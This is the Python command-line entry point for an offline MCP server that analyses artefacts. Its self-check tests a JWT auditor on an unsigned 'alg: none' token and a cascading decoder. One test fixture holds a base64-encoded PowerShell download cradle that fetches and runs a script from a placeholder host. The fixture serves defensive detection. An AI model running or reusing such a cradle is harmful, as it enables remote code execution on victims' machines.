"""Point d'entrée : `python -m artefact_mcp` ou `artefact-mcp`."""

from __future__ import annotations

import argparse
import base64
import logging
import sys

from argus_net import forcer_utf8

from .server import build_server

logger = logging.getLogger(__name__)


def _configure_logging(level: str = "INFO") -> None:
    """Journalisation sur stderr : stdout porte le protocole JSON-RPC."""
    logging.basicConfig(
        stream=sys.stderr,
        level=getattr(logging, level.upper(), logging.INFO),
        format="%(asctime)s %(levelname)-8s %(name)s : %(message)s",
        force=True,
    )


def _run_check() -> int:
    """Vérifie les deux chaînes d'analyse, sans réseau."""
    import json
    import time

    from . import decodage as dec
    from . import jwt as jw

    echecs = 0

    print()
    print("Lecture de jeton")
    print("─" * 16)

    def b64url(donnees: bytes) -> str:
        return base64.urlsafe_b64encode(donnees).decode().rstrip("=")

    maintenant = int(time.time())
    temoin = (
        b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
        + "."
        + b64url(json.dumps({"iss": "controle", "exp": maintenant + 60}).encode())
        + ".x"
    )
    jeton = jw.auditer(jw.lire(temoin))
    if jeton.algorithm == "none" and any("NON SIGNÉ" in f for f in jeton.findings):
        print("  ✓ `alg: none` reconnu et signalé")
    else:
        print("  ✗ `alg: none` n'a pas été signalé")
        echecs += 1
    if jeton.signature_verified is False:
        print("  ✓ la signature n'est jamais annoncée comme vérifiée")
    else:
        print("  ✗ le jeton se prétend vérifié")
        echecs += 1

    print()
    print("Décodage en cascade")
    print("─" * 19)
    commande = "IEX (New-Object Net.WebClient).DownloadString('http://exemple/a.ps1')"
    encode = base64.b64encode(commande.encode("utf-16-le")).decode()
    resultat = dec.decoder(encode)
    if commande in resultat.decoded:
        print(f"  ✓ powershell -enc décodé ({len(resultat.layers)} couche)")
    else:
        print("  ✗ la charge UTF-16LE + base64 n'a pas été décodée")
        echecs += 1

    clair = dec.decoder("ceci est du texte normal, rien a decoder")
    if not clair.layers:
        print("  ✓ un texte en clair n'est pas « décodé » à tort")
    else:
        print(f"  ✗ un texte en clair a traversé {len(clair.layers)} couche(s) imaginaire(s)")
        echecs += 1

    binaire = dec.decoder(base64.b64encode(b"MZ\x90\x00" + b"\x00" * 64).decode())
    if binaire.file_type and "PE" in binaire.file_type:
        print("  ✓ un exécutable est reconnu à sa signature, pas exécuté")
    else:
        print("  ✗ la signature d'exécutable n'a pas été reconnue")
        echecs += 1

    print()
    if echecs:
        print(f"{echecs} contrôle(s) en échec.")
    else:
        print("Aucun appel réseau n'a été effectué.")
    print()
    return 1 if echecs else 0


def main() -> None:
    # Avant tout affichage : la console Windows est en cp1252 par defaut.
    forcer_utf8()
    parser = argparse.ArgumentParser(
        prog="artefact-mcp",
        description="Serveur MCP d'analyse d'artefacts, entièrement hors ligne.",
    )
    parser.add_argument("--check", action="store_true", help="Vérifie la chaîne et quitte.")
    parser.add_argument("--log-level", default="INFO")
    args = parser.parse_args()

    _configure_logging(args.log_level)

    if args.check:
        raise SystemExit(_run_check())

    build_server().run()


if __name__ == "__main__":
    main()
